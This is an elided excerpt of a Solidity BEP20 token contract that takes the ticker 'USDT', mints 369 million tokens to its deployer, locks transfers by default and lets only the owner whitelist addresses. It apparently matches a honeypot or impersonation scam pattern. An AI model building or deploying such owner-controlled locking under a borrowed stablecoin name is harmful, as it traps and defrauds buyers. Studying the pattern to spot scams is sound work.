...
contract USDT is Context, iBEP20, Ownable {
  ...
  constructor() public {
    ...
    _symbol = 'USDT';
    _decimals = 18;
    _totalSupply = 3.69*10**8 * 10**18; //369 Million
    locked = true;
    _balances[msg.sender] = _totalSupply;
    unlocked[address(this)] = true;
    unlocked[address(Owneraddress)] = true;
  ...
  function closeLocking() public onlyOwner {
        locked = false;
  }

  function enableLocking() public onlyOwner {
        locked = true;
  }
  ...
  */
  ...
  function setOwnerAddress(address _ownerAddress) public onlyOwner {
        ...
        unlocked[_ownerAddress] = !unlocked[_ownerAddress];
    }
